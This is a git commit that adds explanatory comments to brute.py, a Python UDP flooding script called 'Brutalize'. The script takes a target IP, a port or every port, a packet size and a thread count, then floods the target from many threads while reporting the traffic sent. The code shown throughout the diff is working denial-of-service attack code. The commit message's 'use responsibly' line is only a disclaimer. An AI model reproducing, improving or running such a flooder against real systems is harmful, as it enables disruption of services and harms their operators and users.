ec872419e7cdce573a29b280dec87c8b88f3811d
Dad <107422850+dad84@users.noreply.github.com>
2023-08-13 09:04:37 +0200

    Update brute.py
    With the above comments, the functionality and purpose of each section of the code are explained in detail. Remember to use this script responsibly and ethically.

--- brute.py
+++ brute.py
@@ -1,3 +1,4 @@
+# Required Libraries
 from socket import socket, AF_INET, SOCK_DGRAM
 from threading import Thread
 from random import randint
@@ -6,26 +7,35 @@ import re
 
 class Brutalize:
     def __init__(self, ip, port, force, threads):
+        # Initialization of the class variables
         self.ip = ip
         self.port = port
         self.force = force
         self.threads = threads
+        # Create a UDP client socket
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
+        # Data to be sent in each packet
         self.data = str.encode("x" * self.force)
         self.len = len(self.data)
+        # Control variable for the attack loop
         self.on = False
+        # List to track threads
         self.threads_list = []
 
     def flood(self):
+        # Start the attack
         self.on = True
         self.sent = 0
+        # Create threads to send packets
         for _ in range(self.threads):
             t = Thread(target=self.send)
             t.start()
             self.threads_list.append(t)
+        # Start a thread to display attack info
         Thread(target=self.info).start()
 
     def info(self):
+        # Display attack statistics
         interval = 0.05
         now = time()
         size = 0
@@ -46,11 +56,13 @@ class Brutalize:
             now += 1
 
     def stop(self):
+        # Stop the attack and join all threads
         self.on = False
         for thread in self.threads_list:
             thread.join()
 
     def send(self):
+        # Send packets to the target
         while self.on:
             try:
                 self.client.sendto(self.data, self._randaddr())
@@ -59,22 +71,28 @@ class Brutalize:
                 print(f"Error sending packet: {e}")
 
     def _randaddr(self):
+        # Generate a random address with the target IP and a random port
         return (self.ip, self._randport())
 
     def _randport(self):
+        # Generate a random port number
         return self.port or randint(1, 65535)
 
 def validate_ip(ip):
+    # Validate the IP address using regex
     pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})(\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})){3}$")
     return bool(pattern.match(ip))
 
 def main():
+    # Collect user input
     ip = input("Enter the IP to Brutalize: ")
+    # Validate IP
     if not validate_ip(ip):
         print("Error! Please enter a correct IP address.")
         exit()
 
     port = input("Enter port [press enter to attack all ports]: ")
+    # Validate port
     if port == '':
         port = None
     else:
@@ -87,6 +105,7 @@ def main():
             exit()
 
     force = input("Bytes per packet [press enter for 1250]: ")
+    # Validate force (packet size)
     if force == '':
         force = 1250
     else:
@@ -97,6 +116,7 @@ def main():
             exit()
 
     threads = input("Threads [press enter for 100]: ")
+    # Validate number of threads
     if threads == '':
         threads = 100
     else:
@@ -108,6 +128,7 @@ def main():
 
     cport = '' if port is None else f':{port}'
     print(f"Starting attack on {ip}{cport}.", end='\r')
+    # Initialize Brutalize class
     brute = Brutalize(ip, port, force, threads)
     try:
         brute.flood()
@@ -118,6 +139,7 @@ def main():
         while brute.on:
             sleep(1)
     except KeyboardInterrupt:
+        # Stop the attack on a keyboard interrupt
         brute.stop()
         print(f"\nAttack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')
     input("Press enter to exit.")
